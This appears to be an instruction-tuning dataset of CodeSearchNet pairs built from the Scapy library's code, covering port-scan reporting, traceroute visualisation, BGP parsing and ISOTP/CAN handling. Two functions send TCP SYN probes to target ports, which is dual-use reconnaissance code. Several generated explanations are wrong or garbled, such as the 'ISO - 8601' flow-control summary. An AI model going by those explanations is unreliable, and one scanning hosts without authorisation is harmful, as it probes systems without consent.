{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef report_ports(target, ports):\n    ans, unans = sr(IP(dst=target) / TCP(dport=ports), timeout=5)\n    rep = \"\\\\begin{tabular}{|r|l|l|}\\n\\\\hline\\n\"\n    for s, r in ans:\n        if not r.haslayer(ICMP):\n            if r.payload.flags == 0x12:\n                rep += r.sprintf(\"%TCP.sport% & open & SA \\\\\\\\\\n\")\n    rep += \"\\\\hline\\n\"\n    for s, r in ans:\n        if r.haslayer(ICMP):\n            rep += r.sprintf(\"%TCPerror.dport% & closed & ICMP type %ICMP.type%/%ICMP.code% from %IP.src% \\\\\\\\\\n\")  # noqa: E501\n        elif r.payload.flags != 0x12:\n            rep += r.sprintf(\"%TCP.sport% & closed & TCP %TCP.flags% \\\\\\\\\\n\")\n    rep += \"\\\\hline\\n\"\n    for i in unans:\n        rep += i.sprintf(\"%TCP.dport% & ? & unanswered \\\\\\\\\\n\")\n    rep += \"\\\\hline\\n\\\\end{tabular}\\n\"\n    return rep", "response": "portscan a target and output a LaTeX table\nreport_ports"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nidentifying IP id values classes in a list of packets lst a list of packets funcID a function that returns IP id values classes a list of packets lst a list of packets funcpres a function that returns IP id values classes a list of packets that return IP id values", "response": "def IPID_count(lst, funcID=lambda x: x[1].id, funcpres=lambda x: x[1].summary()):  # noqa: E501\n    \"\"\"Identify IP id values classes in a list of packets\n\nlst:      a list of packets\nfuncID:   a function that returns IP id values\nfuncpres: a function used to summarize packets\"\"\"\n    idlst = [funcID(e) for e in lst]\n    idlst.sort()\n    classes = [idlst[0]]\n    classes += [t[1] for t in zip(idlst[:-1], idlst[1:]) if abs(t[0] - t[1]) > 50]  # noqa: E501\n    lst = [(funcID(x), funcpres(x)) for x in lst]\n    lst.sort()\n    print(\"Probably %i classes:\" % len(classes), classes)\n    for id, pr in lst:\n        print(\"%5i\" % id, pr)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn ttl or hlim depending on the IP version", "response": "def _ttl(self):\n        \"\"\"Returns ttl or hlim, depending on the IP version\"\"\"\n        return self.hlim if isinstance(self, scapy.layers.inet6.IPv6) else self.ttl"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef trace3D(self, join=True):\n        # When not ran from a notebook, vpython pooly closes itself\n        # using os._exit once finished. We pack it into a Process\n        import multiprocessing\n        p = multiprocessing.Process(target=self.trace3D_notebook)\n        p.start()\n        if join:\n            p.join()", "response": "Give a 3D representation of the traceroute."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef trace3D_notebook(self):\n        trace = self.get_trace()\n        import vpython\n\n        class IPsphere(vpython.sphere):\n            def __init__(self, ip, **kargs):\n                vpython.sphere.__init__(self, **kargs)\n                self.ip = ip\n                self.label = None\n                self.setlabel(self.ip)\n                self.last_clicked = None\n                self.full = False\n                self.savcolor = vpython.vec(*self.color.value)\n\n            def fullinfos(self):\n                self.full = True\n                self.color = vpython.vec(1, 0, 0)\n                a, b = sr(IP(dst=self.ip) / TCP(dport=[21, 22, 23, 25, 80, 443], flags=\"S\"), timeout=2, verbose=0)  # noqa: E501\n                if len(a) == 0:\n                    txt = \"%s:\\nno results\" % self.ip\n                else:\n                    txt = \"%s:\\n\" % self.ip\n                    for s, r in a:\n                        txt += r.sprintf(\"{TCP:%IP.src%:%TCP.sport% %TCP.flags%}{TCPerror:%IPerror.dst%:%TCPerror.dport% %IP.src% %ir,ICMP.type%}\\n\")  # noqa: E501\n                self.setlabel(txt, visible=1)\n\n            def unfull(self):\n                self.color = self.savcolor\n                self.full = False\n                self.setlabel(self.ip)\n\n            def setlabel(self, txt, visible=None):\n                if self.label is not None:\n                    if visible is None:\n                        visible = self.label.visible\n                    self.label.visible = 0\n                elif visible is None:\n                    visible = 0\n                self.label = vpython.label(text=txt, pos=self.pos, space=self.radius, xoffset=10, yoffset=20, visible=visible)  # noqa: E501\n\n            def check_double_click(self):\n                try:\n                    if self.full or not self.label.visible:\n                        return False\n                    if self.last_clicked is not None:\n                        return (time.time() - self.last_clicked) < 0.5\n                    return False\n                finally:\n                    self.last_clicked = time.time()\n\n            def action(self):\n                self.label.visible ^= 1\n                if self.full:\n                    self.unfull()\n\n        vpython.scene = vpython.canvas()\n        vpython.scene.title = \"<center><u><b>%s</b></u></center>\" % self.listname  # noqa: E501\n        vpython.scene.append_to_caption(\n            re.sub(\n                r'\\%(.*)\\%',\n                r'<span style=\"color: red\">\\1</span>',\n                re.sub(\n                    r'\\`(.*)\\`',\n                    r'<span style=\"color: #3399ff\">\\1</span>',\n                    \"\"\"<u><b>Commands:</b></u>\n%Click% to toggle information about a node.\n%Double click% to perform a quick web scan on this node.\n<u><b>Camera usage:</b></u>\n`Right button drag or Ctrl-drag` to rotate \"camera\" to view scene.\n`Shift-drag` to move the object around.\n`Middle button or Alt-drag` to drag up or down to zoom in or out.\n  On a two-button mouse, `middle is wheel or left + right`.\nTouch screen: pinch/extend to zoom, swipe or two-finger rotate.\"\"\"\n                )\n            )\n        )\n        vpython.scene.exit = True\n        start = vpython.box()\n        rings = {}\n        tr3d = {}\n        for i in trace:\n            tr = trace[i]\n            tr3d[i] = []\n            for t in range(1, max(tr) + 1):\n                if t not in rings:\n                    rings[t] = []\n                if t in tr:\n                    if tr[t] not in rings[t]:\n                        rings[t].append(tr[t])\n                    tr3d[i].append(rings[t].index(tr[t]))\n                else:\n                    rings[t].append((\"unk\", -1))\n                    tr3d[i].append(len(rings[t]) - 1)\n\n        for t in rings:\n            r = rings[t]\n            tmp_len = len(r)\n            for i in range(tmp_len):\n                if r[i][1] == -1:\n                    col = vpython.vec(0.75, 0.75, 0.75)\n                elif r[i][1]:\n                    col = vpython.color.green\n                else:\n                    col = vpython.color.blue\n\n                s = IPsphere(pos=vpython.vec((tmp_len - 1) * vpython.cos(2 * i * vpython.pi / tmp_len), (tmp_len - 1) * vpython.sin(2 * i * vpython.pi / tmp_len), 2 * t),  # noqa: E501\n                             ip=r[i][0],\n                             color=col)\n                for trlst in six.itervalues(tr3d):\n                    if t <= len(trlst):\n                        if trlst[t - 1] == i:\n                            trlst[t - 1] = s\n        forecol = colgen(0.625, 0.4375, 0.25, 0.125)\n        for trlst in six.itervalues(tr3d):\n            col = vpython.vec(*next(forecol))\n            start = vpython.vec(0, 0, 0)\n            for ip in trlst:\n                vpython.cylinder(pos=start, axis=ip.pos - start, color=col, radius=0.2)  # noqa: E501\n                start = ip.pos\n\n        vpython.rate(50)\n\n        # Keys handling\n        # TODO: there is currently no way of closing vpython correctly\n        # https://github.com/BruceSherwood/vpython-jupyter/issues/36\n        # def keyboard_press(ev):\n        #     k = ev.key\n        #     if k == \"esc\" or k == \"q\":\n        #         pass  # TODO: close\n        #\n        # vpython.scene.bind('keydown', keyboard_press)\n\n        # Mouse handling\n        def mouse_click(ev):\n            if ev.press == \"left\":\n                o = vpython.scene.mouse.pick\n                if o and isinstance(o, IPsphere):\n                    if o.check_double_click():\n                        if o.ip == \"unk\":\n                            return\n                        o.fullinfos()\n                    else:\n                        o.action()\n\n        vpython.scene.bind('mousedown', mouse_click)", "response": "Same than trace3D_notebook but used when ran from Jupyther notebooks"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndisplays traceroute results on a world map.", "response": "def world_trace(self):\n        \"\"\"Display traceroute results on a world map.\"\"\"\n\n        # Check that the geoip2 module can be imported\n        # Doc: http://geoip2.readthedocs.io/en/latest/\n        try:\n            # GeoIP2 modules need to be imported as below\n            import geoip2.database\n            import geoip2.errors\n        except ImportError:\n            warning(\"Cannot import geoip2. Won't be able to plot the world.\")\n            return []\n        # Check availability of database\n        if not conf.geoip_city:\n            warning(\"Cannot import the geolite2 CITY database.\\n\"\n                    \"Download it from http://dev.maxmind.com/geoip/geoip2/geolite2/\"  # noqa: E501\n                    \" then set its path to conf.geoip_city\")\n            return []\n        # Check availability of plotting devices\n        try:\n            import cartopy.crs as ccrs\n        except ImportError:\n            warning(\"Cannot import cartopy.\\n\"\n                    \"More infos on http://scitools.org.uk/cartopy/docs/latest/installing.html\")  # noqa: E501\n            return []\n        if not MATPLOTLIB:\n            warning(\"Matplotlib is not installed. Won't be able to plot the world.\")  # noqa: E501\n            return []\n\n        # Open & read the GeoListIP2 database\n        try:\n            db = geoip2.database.Reader(conf.geoip_city)\n        except Exception:\n            warning(\"Cannot open geoip2 database at %s\", conf.geoip_city)\n            return []\n\n        # Regroup results per trace\n        ips = {}\n        rt = {}\n        ports_done = {}\n        for s, r in self.res:\n            ips[r.src] = None\n            if s.haslayer(TCP) or s.haslayer(UDP):\n                trace_id = (s.src, s.dst, s.proto, s.dport)\n            elif s.haslayer(ICMP):\n                trace_id = (s.src, s.dst, s.proto, s.type)\n            else:\n                trace_id = (s.src, s.dst, s.proto, 0)\n            trace = rt.get(trace_id, {})\n            if not r.haslayer(ICMP) or r.type != 11:\n                if trace_id in ports_done:\n                    continue\n                ports_done[trace_id] = None\n            trace[s.ttl] = r.src\n            rt[trace_id] = trace\n\n        # Get the addresses locations\n        trt = {}\n        for trace_id in rt:\n            trace = rt[trace_id]\n            loctrace = []\n            for i in range(max(trace)):\n                ip = trace.get(i, None)\n                if ip is None:\n                    continue\n                # Fetch database\n                try:\n                    sresult = db.city(ip)\n                except geoip2.errors.AddressNotFoundError:\n                    continue\n                loctrace.append((sresult.location.longitude, sresult.location.latitude))  # noqa: E501\n            if loctrace:\n                trt[trace_id] = loctrace\n\n        # Load the map renderer\n        plt.figure(num='Scapy')\n        ax = plt.axes(projection=ccrs.PlateCarree())\n        # Draw countries\n        ax.coastlines()\n        ax.stock_img()\n        # Set normal size\n        ax.set_global()\n        # Add title\n        plt.title(\"Scapy traceroute results\")\n\n        from matplotlib.collections import LineCollection\n        from matplotlib import colors as mcolors\n        colors_cycle = iter(mcolors.BASE_COLORS)\n        lines = []\n\n        # Split traceroute measurement\n        for key, trc in six.iteritems(trt):\n            # Get next color\n            color = next(colors_cycle)\n            # Gather mesurments data\n            data_lines = [(trc[i], trc[i + 1]) for i in range(len(trc) - 1)]\n            # Create line collection\n            line_col = LineCollection(data_lines, linewidths=2,\n                                      label=key[1],\n                                      color=color)\n            lines.append(line_col)\n            ax.add_collection(line_col)\n            # Create map points\n            lines.extend([ax.plot(*x, marker='.', color=color) for x in trc])\n\n        # Generate legend\n        ax.legend()\n\n        # Call show() if matplotlib is not inlined\n        if not MATPLOTLIB_INLINED:\n            plt.show()\n\n        # Clean\n        ax.remove()\n\n        # Return the drawn lines\n        return lines"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef m2i(self, pkt, s):\n        diff_tag, s = BER_tagging_dec(s, hidden_tag=self.ASN1_tag,\n                                      implicit_tag=self.implicit_tag,\n                                      explicit_tag=self.explicit_tag,\n                                      safe=self.flexible_tag)\n        if diff_tag is not None:\n            # this implies that flexible_tag was True\n            if self.implicit_tag is not None:\n                self.implicit_tag = diff_tag\n            elif self.explicit_tag is not None:\n                self.explicit_tag = diff_tag\n        codec = self.ASN1_tag.get_codec(pkt.ASN1_codec)\n        if self.flexible_tag:\n            return codec.safedec(s, context=self.context)\n        else:\n            return codec.dec(s, context=self.context)", "response": "Decode a string into a single object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef m2i(self, pkt, s):\n        if len(s) == 0:\n            raise ASN1_Error(\"ASN1F_CHOICE: got empty string\")\n        _, s = BER_tagging_dec(s, hidden_tag=self.ASN1_tag,\n                               explicit_tag=self.explicit_tag)\n        tag, _ = BER_id_dec(s)\n        if tag not in self.choices:\n            if self.flexible_tag:\n                choice = ASN1F_field\n            else:\n                raise ASN1_Error(\"ASN1F_CHOICE: unexpected field\")\n        else:\n            choice = self.choices[tag]\n        if hasattr(choice, \"ASN1_root\"):\n            # we don't want to import ASN1_Packet in this module...\n            return self.extract_packet(choice, s)\n        elif isinstance(choice, type):\n            # XXX find a way not to instantiate the ASN1F_field\n            return choice(self.name, b\"\").m2i(pkt, s)\n        else:\n            # XXX check properly if this is an ASN1F_PACKET\n            return choice.m2i(pkt, s)", "response": "This method will take a string and return the corresponding field or packet."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef igmpize(self):\n        gaddr = self.gaddr if hasattr(self, \"gaddr\") and self.gaddr else \"0.0.0.0\"  # noqa: E501\n        underlayer = self.underlayer\n        if self.type not in [0x11, 0x30]:                               # General Rule 1  # noqa: E501\n            self.mrcode = 0\n        if isinstance(underlayer, IP):\n            if (self.type == 0x11):\n                if (gaddr == \"0.0.0.0\"):\n                    underlayer.dst = \"224.0.0.1\"                        # IP rule 1  # noqa: E501\n                elif isValidMCAddr(gaddr):\n                    underlayer.dst = gaddr                              # IP rule 3a  # noqa: E501\n                else:\n                    warning(\"Invalid IGMP Group Address detected !\")\n                    return False\n            elif ((self.type == 0x17) and isValidMCAddr(gaddr)):\n                underlayer.dst = \"224.0.0.2\"                           # IP rule 2  # noqa: E501\n            elif ((self.type == 0x12) or (self.type == 0x16)) and (isValidMCAddr(gaddr)):  # noqa: E501\n                underlayer.dst = gaddr                                 # IP rule 3b  # noqa: E501\n            else:\n                warning(\"Invalid IGMP Type detected !\")\n                return False\n            if not any(isinstance(x, IPOption_Router_Alert) for x in underlayer.options):  # noqa: E501\n                underlayer.options.append(IPOption_Router_Alert())\n            underlayer.ttl = 1                                         # IP rule 4\n            _root = self.firstlayer()\n            if _root.haslayer(Ether):\n                # Force recalculate Ether dst\n                _root[Ether].dst = getmacbyip(underlayer.dst)          # Ether rule 1  # noqa: E501\n        from scapy.contrib.igmpv3 import IGMPv3\n        if isinstance(self, IGMPv3):\n            self.encode_maxrespcode()\n        return True", "response": "This function will attempt to fixup the IGMP message according to the RFC 2236 section 2. 1."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _bgp_dispatcher(payload):\n\n    cls = conf.raw_layer\n\n    # By default, calling BGP() will build a BGPHeader.\n    if payload is None:\n        cls = _get_cls(\"BGPHeader\", conf.raw_layer)\n\n    else:\n        if len(payload) >= _BGP_HEADER_SIZE and\\\n                payload[:16] == _BGP_HEADER_MARKER:\n\n            # Get BGP message type\n            message_type = orb(payload[18])\n            if message_type == 4:\n                cls = _get_cls(\"BGPKeepAlive\")\n            else:\n                cls = _get_cls(\"BGPHeader\")\n\n    return cls", "response": "Returns the right class for a given BGP message."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _bgp_capability_dispatcher(payload):\n\n    cls = _capabilities_registry[\"BGPCapGeneric\"]\n\n    # By default, calling BGPCapability() will build a \"generic\" capability.\n    if payload is None:\n        cls = _capabilities_registry[\"BGPCapGeneric\"]\n\n    else:\n        length = len(payload)\n        if length >= _BGP_CAPABILITY_MIN_SIZE:\n            code = orb(payload[0])\n            cls = _get_cls(_capabilities_objects.get(code, \"BGPCapGeneric\"))\n\n    return cls", "response": "Returns the right class for a given BGP capability."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef i2m(self, pkt, i):\n        mask, ip = i\n        ip = socket.inet_aton(ip)\n        return struct.pack(\">B\", mask) + ip[:self.mask2iplen(mask)]", "response": "Internal IP as bytes mask as int to machine name representation."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef i2m(self, pkt, i):\n        mask, ip = i\n        ip = pton_ntop.inet_pton(socket.AF_INET6, ip)\n        return struct.pack(\">B\", mask) + ip[:self.mask2iplen(mask)]", "response": "Internal representation of the internal entry."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck that the payload is long enough.", "response": "def pre_dissect(self, s):\n        \"\"\"\n        Check that the payload is long enough (at least 2 bytes).\n        \"\"\"\n        length = len(s)\n        if length < _BGP_CAPABILITY_MIN_SIZE:\n            err = \" ({}\".format(length) + \" is < _BGP_CAPABILITY_MIN_SIZE \"\n            err += \"({})).\".format(_BGP_CAPABILITY_MIN_SIZE)\n            raise _BGPInvalidDataException(err)\n        return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef post_build(self, pkt, pay):\n        if self.length is None:\n            pkt = pkt[:4] + chb(len(pay)) + pkt[5:]\n        return pkt + pay", "response": "This method is called when the packet is built and the pay is added to the packet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef guess_payload_class(self, payload):\n        t = (orb(payload[0]) & 0xf0) >> 4\n        if t == 0:\n            return ISOTP_SF\n        elif t == 1:\n            return ISOTP_FF\n        elif t == 2:\n            return ISOTP_CF\n        else:\n            return ISOTP_FC", "response": "Guesses the ISOTP class from the payload."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef feed(self, can):\n        if not isinstance(can, CAN):\n            raise Scapy_Exception(\"argument is not a CAN frame\")\n        identifier = can.identifier\n        data = bytes(can.data)\n\n        if len(data) > 1 and self.use_ext_addr is not True:\n            self._try_feed(identifier, None, data)\n        if len(data) > 2 and self.use_ext_addr is not False:\n            ea = six.indexbytes(data, 0)\n            self._try_feed(identifier, ea, data[1:])", "response": "Attempt to feed an incoming CAN frame into the state machine."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef pop(self, identifier=None, ext_addr=None, basecls=ISOTP):\n\n        if identifier is not None:\n            for i in range(len(self.ready)):\n                b = self.ready[i]\n                identifier = b[0]\n                ea = b[1]\n                if identifier == identifier and ext_addr == ea:\n                    return ISOTPMessageBuilder._build(self.ready.pop(i))\n            return None\n\n        if len(self.ready) > 0:\n            return ISOTPMessageBuilder._build(self.ready.pop(0))\n        return None", "response": "Returns an ISOTP message with the specified identifier and extended address."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef begin_send(self, p):\n        if hasattr(p, \"sent_time\"):\n            p.sent_time = time.time()\n\n        return self.outs.begin_send(bytes(p))", "response": "Begin the transmission of a message p. This method returns after the message has been sent."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef recv_with_timeout(self, timeout=1):\n        msg = self.ins.recv(timeout)\n        t = time.time()\n        if msg is None:\n            raise Scapy_Exception(\"Timeout\")\n        return self.basecls, msg, t", "response": "Receive a complete ISOTP message blocking until a message is received or the specified timeout is reached."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreceiving a complete ISOTP message.", "response": "def recv_raw(self, x=0xffff):\n        \"\"\"Receive a complete ISOTP message, blocking until a message is\n        received or the specified timeout is reached.\n        If self.timeout is 0, then this function doesn't block and returns the\n        first frame in the receive buffer or None if there isn't any.\"\"\"\n        msg = self.ins.recv()\n        t = time.time()\n        return self.basecls, msg, t"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef select(sockets, remain=None):\n        blocking = remain is None or remain > 0\n\n        def find_ready_sockets():\n            return list(filter(lambda x: not x.ins.rx_queue.empty(), sockets))\n\n        ready_sockets = find_ready_sockets()\n        if len(ready_sockets) > 0 or not blocking:\n            return ready_sockets, None\n\n        exit_select = Event()\n\n        def my_cb(msg):\n            exit_select.set()\n\n        try:\n            for s in sockets:\n                s.ins.rx_callbacks.append(my_cb)\n\n            exit_select.wait(remain)\n\n        finally:\n            for s in sockets:\n                try:\n                    s.ins.rx_callbacks.remove(my_cb)\n                except ValueError:\n                    pass\n\n        ready_sockets = find_ready_sockets()\n        return ready_sockets, None", "response": "This function is called during sendrecv routine to wait for a set of sockets to be ready to receive a new entry."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_timeout(self, timeout, callback):\n        if not self._ready_sem.acquire(False):\n            raise Scapy_Exception(\"Timer was already started\")\n\n        self._callback = callback\n        self._timeout = timeout\n        self._cancelled.clear()\n        self._busy_sem.release()", "response": "Call callback in timeout seconds unless cancelled."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstop the timer without executing the callback.", "response": "def cancel(self):\n        \"\"\"Stop the timer without executing the callback.\"\"\"\n        self._cancelled.set()\n        if not self._dead:\n            self._ready_sem.acquire()\n            self._ready_sem.release()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stop(self):\n        if not self._dead:\n            self._killed = True\n            self._cancelled.set()\n            self._busy_sem.release()\n            self.join()\n            if not self._ready_sem.acquire(False):\n                warning(\"ISOTP Timer thread may not have stopped \"\n                        \"correctly\")", "response": "Stop the thread making this object unusable."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfunctions that must be called every time a CAN frame is received. to is called every time a CAN frame is received. to is advance the state machine.", "response": "def on_recv(self, cf):\n        \"\"\"Function that must be called every time a CAN frame is received, to\n        advance the state machine.\"\"\"\n\n        data = bytes(cf.data)\n\n        if len(data) < 2:\n            return\n\n        ae = 0\n        if self.extended_rx_addr is not None:\n            ae = 1\n            if len(data) < 3:\n                return\n            if six.indexbytes(data, 0) != self.extended_rx_addr:\n                return\n\n        n_pci = six.indexbytes(data, ae) & 0xf0\n\n        if n_pci == N_PCI_FC:\n            with self.tx_mutex:\n                self._recv_fc(data[ae:])\n        elif n_pci == N_PCI_SF:\n            with self.rx_mutex:\n                self._recv_sf(data[ae:])\n        elif n_pci == N_PCI_FF:\n            with self.rx_mutex:\n                self._recv_ff(data[ae:])\n        elif n_pci == N_PCI_CF:\n            with self.rx_mutex:\n                self._recv_cf(data[ae:])"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _recv_fc(self, data):\n        if (self.tx_state != ISOTP_WAIT_FC and\n                self.tx_state != ISOTP_WAIT_FIRST_FC):\n            return 0\n\n        self.tx_timer.cancel()\n\n        if len(data) < 3:\n            self.tx_state = ISOTP_IDLE\n            self.tx_exception = \"CF frame discarded because it was too short\"\n            self.tx_done.set()\n            raise Scapy_Exception(self.tx_exception)\n\n        # get communication parameters only from the first FC frame\n        if self.tx_state == ISOTP_WAIT_FIRST_FC:\n            self.txfc_bs = six.indexbytes(data, 1)\n            self.txfc_stmin = six.indexbytes(data, 2)\n\n        if ((self.txfc_stmin > 0x7F) and\n                ((self.txfc_stmin < 0xF1) or (self.txfc_stmin > 0xF9))):\n            self.txfc_stmin = 0x7F\n\n        if six.indexbytes(data, 2) <= 127:\n            tx_gap = six.indexbytes(data, 2) / 1000.0\n        elif 0xf1 <= six.indexbytes(data, 2) <= 0xf9:\n            tx_gap = (six.indexbytes(data, 2) & 0x0f) / 10000.0\n        else:\n            tx_gap = 0\n        self.tx_gap = tx_gap\n\n        self.tx_state = ISOTP_WAIT_FC\n\n        isotp_fc = six.indexbytes(data, 0) & 0x0f\n\n        if isotp_fc == ISOTP_FC_CTS:\n            self.tx_bs = 0\n            self.tx_state = ISOTP_SENDING\n            # start cyclic timer for sending CF frame\n            self.tx_timer.set_timeout(self.tx_gap, self._tx_timer_handler)\n        elif isotp_fc == ISOTP_FC_WT:\n            # start timer to wait for next FC frame\n            self.tx_state = ISOTP_WAIT_FC\n            self.tx_timer.set_timeout(self.fc_timeout, self._tx_timer_handler)\n        elif isotp_fc == ISOTP_FC_OVFLW:\n            # overflow in receiver side\n            self.tx_state = ISOTP_IDLE\n            self.tx_exception = \"Overflow happened at the receiver side\"\n            self.tx_done.set()\n            raise Scapy_Exception(self.tx_exception)\n        else:\n            self.tx_state = ISOTP_IDLE\n            self.tx_exception = \"Unknown FC frame type\"\n            self.tx_done.set()\n            raise Scapy_Exception(self.tx_exception)\n\n        return 0", "response": "Process a received Flow Control frame and return the corresponding ISO - 8601 version of the data."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _recv_sf(self, data):\n        self.rx_timer.cancel()\n        if self.rx_state != ISOTP_IDLE:\n            warning(\"RX state was reset because single frame was received\")\n            self.rx_state = ISOTP_IDLE\n\n        length = six.indexbytes(data, 0) & 0xf\n        if len(data) - 1 < length:\n            return 1\n\n        msg = data[1:1 + length]\n        self.rx_queue.put(msg)\n        for cb in self.rx_callbacks:\n            cb(msg)\n        self.call_release()\n        return 0", "response": "Process a single frame from the broker."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _recv_ff(self, data):\n        self.rx_timer.cancel()\n        if self.rx_state != ISOTP_IDLE:\n            warning(\"RX state was reset because first frame was received\")\n            self.rx_state = ISOTP_IDLE\n\n        if len(data) < 7:\n            return 1\n        self.rx_ll_dl = len(data)\n\n        # get the FF_DL\n        self.rx_len = (six.indexbytes(data, 0) & 0x0f) * 256 + six.indexbytes(\n            data, 1)\n        ff_pci_sz = 2\n\n        # Check for FF_DL escape sequence supporting 32 bit PDU length\n        if self.rx_len == 0:\n            # FF_DL = 0 => get real length from next 4 bytes\n            self.rx_len = six.indexbytes(data, 2) << 24\n            self.rx_len += six.indexbytes(data, 3) << 16\n            self.rx_len += six.indexbytes(data, 4) << 8\n            self.rx_len += six.indexbytes(data, 5)\n            ff_pci_sz = 6\n\n        # copy the first received data bytes\n        data_bytes = data[ff_pci_sz:]\n        self.rx_idx = len(data_bytes)\n        self.rx_buf = data_bytes\n\n        # initial setup for this pdu reception\n        self.rx_sn = 1\n        self.rx_state = ISOTP_WAIT_DATA\n\n        # no creation of flow control frames\n        if not self.listen_mode:\n            # send our first FC frame\n            load = self.ea_hdr\n            load += struct.pack(\"BBB\", N_PCI_FC, self.rxfc_bs, self.rxfc_stmin)\n            self.can_send(load)\n\n        # wait for a CF\n        self.rx_bs = 0\n        self.rx_timer.set_timeout(self.cf_timeout, self._rx_timer_handler)\n\n        return 0", "response": "Process a first Frame frame from the packet."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprocess a received Consecutive Frame frame and return the next CF.", "response": "def _recv_cf(self, data):\n        \"\"\"Process a received 'Consecutive Frame' frame\"\"\"\n        if self.rx_state != ISOTP_WAIT_DATA:\n            return 0\n\n        self.rx_timer.cancel()\n\n        # CFs are never longer than the FF\n        if len(data) > self.rx_ll_dl:\n            return 1\n\n        # CFs have usually the LL_DL length\n        if len(data) < self.rx_ll_dl:\n            # this is only allowed for the last CF\n            if self.rx_len - self.rx_idx > self.rx_ll_dl:\n                warning(\"Received a CF with insuffifient length\")\n                return 1\n\n        if six.indexbytes(data, 0) & 0x0f != self.rx_sn:\n            # Wrong sequence number\n            warning(\"RX state was reset because wrong sequence number was \"\n                    \"received\")\n            self.rx_state = ISOTP_IDLE\n            return 1\n\n        self.rx_sn = (self.rx_sn + 1) % 16\n        self.rx_buf += data[1:]\n        self.rx_idx = len(self.rx_buf)\n\n        if self.rx_idx >= self.rx_len:\n            # we are done\n            self.rx_buf = self.rx_buf[0:self.rx_len]\n            self.rx_state = ISOTP_IDLE\n            self.rx_queue.put(self.rx_buf)\n            for cb in self.rx_callbacks:\n                cb(self.rx_buf)\n            self.call_release()\n            self.rx_buf = None\n            return 0\n\n        # perform blocksize handling, if enabled\n        if self.rxfc_bs != 0:\n            self.rx_bs += 1\n\n            # check if we reached the end of the block\n            if self.rx_bs >= self.rxfc_bs and not self.listen_mode:\n                # send our FC frame\n                load = self.ea_hdr\n                load += struct.pack(\"BBB\", N_PCI_FC, self.rxfc_bs,\n                                    self.rxfc_stmin)\n                self.can_send(load)\n\n        # wait for another CF\n        self.rx_timer.set_timeout(self.cf_timeout, self._rx_timer_handler)\n        return 0"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef begin_send(self, x):\n        with self.tx_mutex:\n            if self.tx_state != ISOTP_IDLE:\n                raise Scapy_Exception(\"Socket is already sending, retry later\")\n\n            self.tx_done.clear()\n            self.tx_exception = None\n            self.tx_state = ISOTP_SENDING\n\n            length = len(x)\n            if length > ISOTP_MAX_DLEN_2015:\n                raise Scapy_Exception(\"Too much data for ISOTP message\")\n\n            if len(self.ea_hdr) + length <= 7:\n                # send a single frame\n                data = self.ea_hdr\n                data += struct.pack(\"B\", length)\n                data += x\n                self.tx_state = ISOTP_IDLE\n                self.can_send(data)\n                self.tx_done.set()\n                for cb in self.tx_callbacks:\n                    cb()\n                return\n\n            # send the first frame\n            data = self.ea_hdr\n            if length > ISOTP_MAX_DLEN:\n                data += struct.pack(\">HI\", 0x1000, length)\n            else:\n                data += struct.pack(\">H\", 0x1000 | length)\n            load = x[0:8 - len(data)]\n            data += load\n            self.can_send(data)\n\n            self.tx_buf = x\n            self.tx_sn = 1\n            self.tx_bs = 0\n            self.tx_idx = len(load)\n\n            self.tx_state = ISOTP_WAIT_FIRST_FC\n            self.tx_timer.set_timeout(self.fc_timeout, self._tx_timer_handler)", "response": "Starts sending an ISOTP message. This method does not block."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef send(self, p):\n        with self.send_mutex:\n            self.begin_send(p)\n\n            # Wait until the tx callback is called\n            self.tx_done.wait()\n            if self.tx_exception is not None:\n                raise Scapy_Exception(self.tx_exception)\n            return", "response": "Send an ISOTP frame and block until the message is sent or an error occurs."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef recv(self, timeout=None):\n\n        try:\n            return self.rx_queue.get(timeout is None or timeout > 0, timeout)\n        except queue.Empty:\n            return None", "response": "Receive an ISOTP frame blocking if none is available in the buffer\n        for at most timeout seconds."}
